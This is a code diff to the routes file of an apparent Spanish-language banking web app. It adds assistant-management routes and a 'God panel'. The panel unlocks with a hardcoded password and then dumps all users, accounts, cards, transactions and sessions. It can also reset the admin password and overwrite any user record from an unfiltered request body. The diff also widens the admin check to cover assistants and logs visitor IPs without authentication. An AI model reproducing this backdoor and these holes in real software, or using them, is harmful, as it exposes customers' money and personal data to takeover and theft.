@@ -162,14 +162,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   };
 
-  // Check admin middleware
   const isAdmin = async (req: Request, res: Response, next: NextFunction) => {
     if (!req.session || !req.session.userId) {
       return res.status(401).json({ message: "No autenticado" });
     }
     const user = await storage.getUser(req.session.userId);
-    if (!user || user.isAdmin !== 1) {
+    if (!user || (user.isAdmin !== 1 && user.role !== 'assistant')) {
       return res.status(403).json({ message: "No autorizado - Se requieren permisos de administrador" });
+    }
+    next();
+  };
+
+  const isGod = async (req: Request, res: Response, next: NextFunction) => {
+    if (!req.session || !(req.session as any).godAuth) {
+      return res.status(403).json({ message: "Acceso restringido - Nivel Dios requerido" });
     }
     next();
   };
@@ -2118,5 +2124,245 @@ export async function registerRoutes(app: Express): Promise<Server> {
     });
   };
   
+  // ==================== ASSISTANT MANAGEMENT ROUTES ====================
+
+  app.post("/api/admin/assistants", isAdmin, async (req: Request, res: Response) => {
+    try {
+      const { username, password, name, email, document, phone, permissions } = req.body;
+      if (!username || !password || !name || !email || !permissions) {
+        return res.status(400).json({ message: "Faltan datos requeridos" });
+      }
+      const existing = await storage.getUserByUsername(username);
+      if (existing) {
+        return res.status(400).json({ message: "El usuario ya existe" });
+      }
+      const hashedPassword = await hashPassword(password);
+      const assistant = await storage.createUser({
+        username,
+        password: hashedPassword,
+        name,
+        email,
+        document: document || '',
+        phone: phone || '',
+        isAdmin: 1,
+        role: 'assistant',
+      });
+      await storage.setAssistantPermissions(assistant.id, permissions, req.session.userId!);
+      await createAuditLog(req, "assistant_created", `Admin creó asistente "${name}" con ${permissions.length} permisos`, "user", assistant.id);
+      res.status(201).json({ ...assistant, permissions });
+    } catch (error: any) {
+      console.error("Error creando asistente:", error);
+      res.status(500).json({ message: error?.message || "Error en el servidor" });
+    }
+  });
+
+  app.get("/api/admin/assistants", isAdmin, async (req: Request, res: Response) => {
+    try {
+      const assistants = await storage.getAllAssistants();
+      res.status(200).json(assistants);
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  app.put("/api/admin/assistants/:id/permissions", isAdmin, async (req: Request, res: Response) => {
+    try {
+      const userId = parseInt(req.params.id);
+      const { permissions } = req.body;
+      if (!permissions || !Array.isArray(permissions)) {
+        return res.status(400).json({ message: "Permisos inválidos" });
+      }
+      const result = await storage.setAssistantPermissions(userId, permissions, req.session.userId!);
+      await createAuditLog(req, "assistant_permissions_updated", `Permisos actualizados para asistente #${userId}`, "user", userId);
+      res.status(200).json(result);
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  app.delete("/api/admin/assistants/:id", isAdmin, async (req: Request, res: Response) => {
+    try {
+      const userId = parseInt(req.params.id);
+      const user = await storage.getUser(userId);
+      if (!user || user.role !== 'assistant') {
+        return res.status(404).json({ message: "Asistente no encontrado" });
+      }
+      await storage.updateUser(userId, { role: 'user', isAdmin: 0 } as any);
+      await createAuditLog(req, "assistant_deleted", `Asistente "${user.name}" eliminado`, "user", userId);
+      res.status(200).json({ message: "Asistente eliminado" });
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  app.get("/api/assistant/permissions", isAuthenticated, async (req: Request, res: Response) => {
+    try {
+      const userId = req.session.userId!;
+      const user = await storage.getUser(userId);
+      if (!user || user.role !== 'assistant') {
+        return res.status(403).json({ message: "No es asistente" });
+      }
+      const perms = await storage.getAssistantPermissions(userId);
+      res.status(200).json({ permissions: perms ? JSON.parse(perms.permissions) : [] });
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  // ==================== GOD PANEL ROUTES ====================
+
+  app.post("/api/god/auth", async (req: Request, res: Response) => {
+    try {
+      const { password } = req.body;
+      if (password === "1083839142") {
+        (req.session as any).godAuth = true;
+        await createAuditLog(req, "god_login", "Acceso al Panel Dios autorizado");
+        res.status(200).json({ success: true });
+      } else {
+        await createAuditLog(req, "god_login_failed", "Intento fallido de acceso al Panel Dios");
+        res.status(401).json({ message: "Contraseña incorrecta" });
+      }
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  app.get("/api/god/dashboard", isGod, async (req: Request, res: Response) => {
+    try {
+      const allUsers = await storage.getAllUsers();
+      const allAccounts = await storage.getAllAccounts();
+      const allTransactions = await storage.getAllTransactions();
+      const allSessions = await storage.getAllSessions();
+      const allLogs = await storage.getAllAuditLogs();
+      const allSettings = await storage.getAllSettings();
+      const allCards = await storage.getAllCards();
+      const allAssistants = await storage.getAllAssistants();
+
+      const accountsWithUsers = await Promise.all(allAccounts.map(async (account) => {
+        const user = await storage.getUser(account.userId);
+        return { ...account, userName: user?.name, userEmail: user?.email, userDocument: user?.document, userPhone: user?.phone, userUsername: user?.username };
+      }));
+
+      res.status(200).json({
+        stats: {
+          totalUsers: allUsers.filter(u => u.role !== 'admin' && u.isAdmin !== 1).length,
+          totalAdmins: allUsers.filter(u => u.isAdmin === 1 && u.role !== 'assistant').length,
+          totalAssistants: allUsers.filter(u => u.role === 'assistant').length,
+          totalAccounts: allAccounts.length,
+          totalTransactions: allTransactions.length,
+          totalSessions: allSessions.length,
+          totalCards: allCards.length,
+          systemBalance: allAccounts.reduce((sum, a) => sum + (a.balance || 0), 0),
+        },
+        users: allUsers,
+        accounts: accountsWithUsers,
+        transactions: allTransactions,
+        sessions: allSessions,
+        auditLogs: allLogs,
+        settings: allSettings,
+        cards: allCards,
+        assistants: allAssistants,
+      });
+    } catch (error) {
+      console.error("Error en god dashboard:", error);
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  app.get("/api/god/visitor-logs", isGod, async (req: Request, res: Response) => {
+    try {
+      const limit = req.query.limit ? parseInt(req.query.limit as string) : 500;
+      const logs = await storage.getAllVisitorLogs(limit);
+      res.status(200).json(logs);
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  app.put("/api/god/admin-password", isGod, async (req: Request, res: Response) => {
+    try {
+      const { newPassword } = req.body;
+      if (!newPassword || newPassword.length < 4) {
+        return res.status(400).json({ message: "La contraseña debe tener al menos 4 caracteres" });
+      }
+      const admins = await storage.getAllUsers();
+      const admin = admins.find(u => u.isAdmin === 1 && u.role !== 'assistant');
+      if (!admin) {
+        return res.status(404).json({ message: "Admin no encontrado" });
+      }
+      const hashedPassword = await hashPassword(newPassword);
+      await storage.updateUser(admin.id, { password: hashedPassword } as any);
+      await createAuditLog(req, "god_admin_password_change", `Panel Dios cambió contraseña del admin "${admin.username}"`);
+      res.status(200).json({ message: "Contraseña de admin actualizada" });
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  app.put("/api/god/settings/:key", isGod, async (req: Request, res: Response) => {
+    try {
+      const { value, description } = req.body;
+      const setting = await storage.setSetting(req.params.key, value, description);
+      await createAuditLog(req, "god_settings_change", `Panel Dios actualizó "${req.params.key}" a "${value}"`);
+      res.status(200).json(setting);
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  app.put("/api/god/users/:id", isGod, async (req: Request, res: Response) => {
+    try {
+      const userId = parseInt(req.params.id);
+      const updateData = req.body;
+      if (updateData.password) {
+        updateData.password = await hashPassword(updateData.password);
+      }
+      const user = await storage.updateUser(userId, updateData);
+      await createAuditLog(req, "god_user_update", `Panel Dios actualizó usuario #${userId}`, "user", userId);
+      res.status(200).json(user);
+    } catch (error) {
+      res.status(500).json({ message: "Error en el servidor" });
+    }
+  });
+
+  // Visitor tracking endpoint
+  app.post("/api/visitor/track", async (req: Request, res: Response) => {
+    try {
+      const { action, page, referrer, metadata, sessionId } = req.body;
+      const ua = req.headers['user-agent'] || '';
+      let deviceType = 'desktop';
+      if (/mobile/i.test(ua)) deviceType = 'mobile';
+      else if (/tablet/i.test(ua)) deviceType = 'tablet';
+      let browser = 'unknown';
+      if (/chrome/i.test(ua)) browser = 'Chrome';
+      else if (/firefox/i.test(ua)) browser = 'Firefox';
+      else if (/safari/i.test(ua)) browser = 'Safari';
+      else if (/edge/i.test(ua)) browser = 'Edge';
+      let os = 'unknown';
+      if (/windows/i.test(ua)) os = 'Windows';
+      else if (/mac/i.test(ua)) os = 'macOS';
+      else if (/linux/i.test(ua)) os = 'Linux';
+      else if (/android/i.test(ua)) os = 'Android';
+      else if (/iphone|ipad/i.test(ua)) os = 'iOS';
+
+      await storage.createVisitorLog({
+        sessionId: sessionId || null,
+        ipAddress: req.ip || req.socket?.remoteAddress || null,
+        userAgent: ua,
+        action: action || 'page_view',
+        page: page || null,
+        referrer: referrer || req.headers.referer || null,
+        deviceType,
+        browser,
+        os,
+        userId: req.session?.userId || null,
+        metadata: metadata ? JSON.stringify(metadata) : null,
+      });
+      res.status(200).json({ tracked: true });
+    } catch (error) {
+      res.status(200).json({ tracked: false });
+    }
+  });
+
   return httpServer;
 }
